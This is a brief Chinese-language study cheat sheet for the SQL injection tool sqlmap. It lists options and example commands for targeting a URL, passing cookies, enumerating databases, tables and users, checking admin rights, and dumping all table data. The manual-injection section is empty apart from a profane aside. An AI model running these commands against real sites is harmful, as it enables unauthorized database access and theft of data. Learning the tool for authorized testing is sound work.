# sqlmap

### 总之介绍一下各种参数吧

一般起始是python sqlmap.py

\-u 决定目标url `sqlmap -u '目标地址'` \
\--cookie 设置cookie 绕过安全检查 `sqlmap -u '目标地址' --cookie 'cookie值'` \
\--dbs 列出所有数据库 `sqlmap -u '目标地址' --dbs` \
\-D 指定数据库 --tables 爆出所有表 `sqlmap -u '目标地址' -D '库名' --tables` \
\-T 指定表 --dump 爆出所有数据 `sqlmap -u '目标地址' -D '库名' -T '表名' --dump` \
\--current-user 显示当前用户 `sqlmap -u '目标地址' --current-user` \
\--is-dba 检测是否为数据库管理员 `sqlmap -u '目标地址' --is-dba` \
\--users 获取所有用户 `sqlmap -u '目标地址' --users`

### 然后是手动注入

这块我不太懂先略过 妈的一定会补的你给我等着傻逼mysql

